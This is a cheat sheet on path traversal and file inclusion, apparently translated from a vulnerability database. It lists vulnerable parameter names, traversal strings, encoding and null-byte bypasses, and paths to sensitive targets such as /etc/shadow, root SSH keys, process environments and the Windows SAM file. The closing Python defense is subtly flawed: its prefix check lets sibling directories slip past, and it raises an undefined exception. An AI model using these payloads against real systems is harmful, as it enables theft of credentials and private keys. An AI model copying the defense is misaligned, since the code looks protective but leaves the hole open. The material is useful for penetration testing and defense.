# Web Security - File traversals and file inclusion

> Source: WooYun Vulnerability database | Dismantled From web-file-infra.md

## Two、File traversals and file inclusion

### 2.1 Nature of vulnerabilities

```
User input space -> [Trust boundary failure] -> File system space
Core: Developers believe"User input=File name", the attacker utilizes"User input=Path instruction"
```

### 2.2 Vulnerability parameter identification

High-frequency parameter names(By frequency of occurrence):

```
File class: filename, filepath, path, file, filePath, hdfile, inputFile
Download type: download, down, attachment, attach, doc
Read class: read, load, get, fetch, open, input
Template class: template, tpl, page, include, temp
Generic Class: url, src, dir, folder, resource, name
```

high-risk functional points(TOP 5):
1. File download interface (27Times) - `down.php, download.jsp`
2. File preview feature (17Times) - `view.php, preview.jsp`
3. Attachment management (6Times) - `attachment.php`
4. Image loading (5Times) - `pic.php, image.jsp`
5. Log Viewing (4Times) - `log.php, viewlog.jsp`

### 2.3 Directory traversalPayload

Basic traversal:

```bash
../                          # LinuxStandard
..\..\                       # WindowsStandard
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

Encoding bypass:

```bash
# URLSingle encoding
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# URLDouble encoding
%252e%252e%252f  |  ..%252f

# Unicode/UTF-8Super Long Encoding (GlassFishUnique)
%c0%ae%c0%ae/%c0%af

# Mixed encoding
..%2f  |  %2e%2e/  |  ..%c0%af
```

Special bypass:

```bash
# Null byte truncation (PHP<5.3.4 / JavaOld version)
../../../etc/passwd%00.jpg

# Question mark truncation
../../../WEB-INF/web.xml%3f

# Path obfuscation
....//  |  ....\/  |  ..\/  |  ./../../

# Absolute path/Protocol bypass
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 Quick Reference Table for Sensitive File Paths

LinuxSystem:

```bash
/etc/passwd                    # User list(Verification preference)
/etc/shadow                    # Password hash
/etc/hosts                     # Host mapping
/root/.ssh/id_rsa              # SSHPrivate key
/root/.bash_history            # Command History
/proc/self/environ             # Process environment variables
/etc/nginx/nginx.conf          # NginxConfiguration
/etc/my.cnf                    # MySQLConfiguration
```

WindowsSystem:

```bash
C:\windows\win.ini             # System configuration(Verification preference)
C:\boot.ini                    # Startup Configuration(XP/2003)
C:\inetpub\wwwroot\web.config  # IISApplication configuration
C:\windows\system32\config\sam # SAMDatabase
```

Java Web:

```bash
WEB-INF/web.xml                         # Core Configuration(Verification preference)
WEB-INF/classes/jdbc.properties          # Database Configuration
WEB-INF/classes/applicationContext.xml   # SpringConfiguration
WEB-INF/classes/hibernate.cfg.xml        # HibernateConfiguration
```

PHPApplication:

```bash
config.php | config.inc.php | db.php | conn.php    # General configuration
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # Core Configuration(Contains connection string)
../web.config              # Parent Directory Configuration
```

### 2.5 Defensive measures

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. Path normalization
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. Validate within allowed directories
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. Whitelisted extensions
    # 4. Verify file existence
    return full_path
```

Key principle: Path normalization(realpath/normpath) -> Directory boundary verification -> Whitelist verification -> Run with minimal privileges

---

